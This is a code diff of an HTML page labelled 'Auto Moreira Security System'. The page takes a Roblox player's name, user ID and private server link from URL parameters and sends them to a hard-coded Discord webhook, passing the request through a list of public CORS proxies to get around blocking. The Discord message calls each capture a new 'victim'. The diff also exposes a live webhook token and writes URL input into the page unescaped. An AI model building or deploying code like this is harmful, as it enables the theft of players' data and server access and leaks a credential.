@@ -1,40 +1,205 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Processing...</title>
+    <title>Auto Moreira</title>
     <meta charset="UTF-8">
-    <!-- ESTA É A CHAVE: redirect automático -->
-    <meta http-equiv="refresh" content="0; url=https://whophzin.github.io/auto-moreira-webhook/process.html">
-    <script>
-        // Pega dados da URL atual
-        const params = new URLSearchParams(window.location.search);
-        
-        // Se tiver parâmetros, salva no localStorage
-        if (params.toString()) {
-            localStorage.setItem('autoMoreiraData', JSON.stringify({
-                player_name: params.get('player_name') || 'N/A',
-                player_id: params.get('player_id') || 'N/A',
-                server_link: params.get('server_link') || 'N/A',
-                timestamp: Date.now()
-            }));
-        }
-        
-        // Redireciona mesmo se o meta tag falhar
-        setTimeout(() => {
-            window.location.href = "https://whophzin.github.io/auto-moreira-webhook/process.html";
-        }, 100);
-    </script>
-</head>
-<body style="background: #0f172a; color: white; text-align: center; padding: 50px;">
-    <div style="border: 8px solid #333; border-top: 8px solid #00ff00; border-radius: 50%; width: 60px; height: 60px; margin: 20px auto; animation: spin 2s linear infinite;"></div>
-    <h1>🛡️ Processing Request...</h1>
-    <p>Please wait while we verify your data.</p>
+    <!-- ESSA LINHA É IMPORTANTE: Permite scripts externos -->
+    <meta http-equiv="Content-Security-Policy" content="default-src *; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net">
+    
+    <!-- Biblioteca axios para fazer requisições -->
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
     
     <style>
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        body { 
+            margin: 0; 
+            padding: 20px; 
+            background: #0f172a; 
+            color: white; 
+            font-family: Arial; 
+            text-align: center;
+        }
+        .status { 
+            margin-top: 20px; 
+            padding: 15px; 
+            border-radius: 8px;
+            max-width: 500px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .success { 
+            background: #065f46; 
+            border: 2px solid #10b981;
+        }
+        .error { 
+            background: #7f1d1d; 
+            border: 2px solid #ef4444;
+        }
+        .processing {
+            background: #1e40af;
+            border: 2px solid #3b82f6;
         }
     </style>
+</head>
+<body>
+    <h1>🛡️ Auto Moreira Security System</h1>
+    <div id="output" class="status processing">Waiting for data...</div>
+    
+    <script>
+        // ============= CONFIGURAÇÃO =============
+        // COLE SEU WEBHOOK DO DISCORD AQUI (NÃO ESQUEÇA!):
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1466545598273552437/VH33E3Wb2olx18f5YD3W8wl80pflegd1wiGMHtRRr6GXTOpLQj18uLc3s4UwRCVrNRhh";
+        // ========================================
+        
+        // Lista de proxies CORS que funcionam
+        const CORS_PROXIES = [
+            'https://api.allorigins.win/raw?url=',
+            'https://corsproxy.io/?',
+            'https://proxy.cors.sh/',
+            'https://api.codetabs.com/v1/proxy?quest=',
+            'https://cors-anywhere.herokuapp.com/'
+        ];
+        
+        // Função principal para enviar ao Discord
+        async function sendToDiscord(data) {
+            const payload = {
+                content: `@everyone **🚨 AUTO MOREIRA - NOVA VÍTIMA CAPTURADA!**`,
+                embeds: [{
+                    title: "🔓 SISTEMA DE CAPTURA ATIVADO",
+                    color: 0xff0000,
+                    fields: [
+                        { 
+                            name: "👤 Jogador", 
+                            value: "```" + (data.player_name || "N/A") + "```", 
+                            inline: true 
+                        },
+                        { 
+                            name: "🆔 User ID", 
+                            value: "```" + (data.player_id || "N/A") + "```", 
+                            inline: true 
+                        },
+                        { 
+                            name: "🔗 Link do Servidor", 
+                            value: "```" + (data.server_link || "N/A") + "```", 
+                            inline: false 
+                        },
+                        { 
+                            name: "⏰ Hora do Envio", 
+                            value: new Date().toLocaleString('pt-BR'), 
+                            inline: true 
+                        },
+                        { 
+                            name: "📅 Data", 
+                            value: new Date().toLocaleDateString('pt-BR'), 
+                            inline: true 
+                        }
+                    ],
+                    footer: { 
+                        text: "GitHub Pages • Sistema Auto Moreira" 
+                    },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            
+            // Tenta cada proxy até conseguir
+            for (let i = 0; i < CORS_PROXIES.length; i++) {
+                const proxy = CORS_PROXIES[i];
+                try {
+                    console.log(`🔧 Tentando proxy ${i + 1}: ${proxy}`);
+                    
+                    const proxyUrl = proxy + encodeURIComponent(DISCORD_WEBHOOK);
+                    
+                    const response = await axios.post(
+                        proxyUrl,
+                        payload,
+                        { 
+                            headers: { 
+                                'Content-Type': 'application/json',
+                                'X-Requested-With': 'XMLHttpRequest'
+                            },
+                            timeout: 10000 // 10 segundos timeout
+                        }
+                    );
+                    
+                    if (response.status === 200 || response.status === 204) {
+                        console.log(`✅ Proxy ${i + 1} funcionou!`);
+                        return { 
+                            success: true, 
+                            proxyUsed: proxy,
+                            status: response.status
+                        };
+                    }
+                } catch (error) {
+                    console.log(`❌ Proxy ${i + 1} falhou:`, error.message);
+                    continue;
+                }
+            }
+            
+            return { success: false };
+        }
+        
+        // Processa quando a página carrega
+        document.addEventListener('DOMContentLoaded', async () => {
+            const params = new URLSearchParams(window.location.search);
+            const output = document.getElementById('output');
+            
+            // Se não tiver parâmetros, mostra mensagem normal
+            if (!params.toString()) {
+                output.innerHTML = `
+                    <div class="status processing">
+                        <h3>✅ Sistema Pronto</h3>
+                        <p>Aguardando dados do Roblox...</p>
+                        <small>URL: ${window.location.href}</small>
+                    </div>
+                `;
+                return;
+            }
+            
+            // Pega os dados da URL
+            const data = {
+                player_name: params.get('player_name') || 'Não informado',
+                player_id: params.get('player_id') || 'Não informado',
+                server_link: params.get('server_link') || 'Não fornecido',
+                game_name: params.get('game_name') || 'Roblox',
+                timestamp: params.get('time') || Date.now()
+            };
+            
+            console.log('📥 Dados recebidos:', data);
+            
+            // Mostra status de processamento
+            output.innerHTML = `
+                <div class="status processing">
+                    <h3>📤 Enviando dados para Discord...</h3>
+                    <p>Jogador: <strong>${data.player_name}</strong></p>
+                    <p>Usando proxies CORS para contornar bloqueios</p>
+                </div>
+            `;
+            
+            // Tenta enviar para Discord
+            const result = await sendToDiscord(data);
+            
+            // Mostra resultado
+            if (result.success) {
+                output.innerHTML = `
+                    <div class="status success">
+                        <h3>✅ Dados Enviados com Sucesso!</h3>
+                        <p>Mensagem enviada para Discord via proxy.</p>
+                        <p><strong>Proxy usado:</strong> ${result.proxyUsed}</p>
+                        <p><small>Jogador: ${data.player_name} | ID: ${data.player_id}</small></p>
+                    </div>
+                `;
+            } else {
+                output.innerHTML = `
+                    <div class="status error">
+                        <h3>⚠️ Dados Recebidos, Mas Erro no Envio</h3>
+                        <p>Os dados foram recebidos, mas não foi possível enviar ao Discord.</p>
+                        <p><strong>Dados capturados:</strong></p>
+                        <p>Jogador: ${data.player_name}</p>
+                        <p>ID: ${data.player_id}</p>
+                        <p>Link: ${data.server_link.substring(0, 50)}...</p>
+                    </div>
+                `;
+            }
+        });
+    </script>
 </body>
 </html>
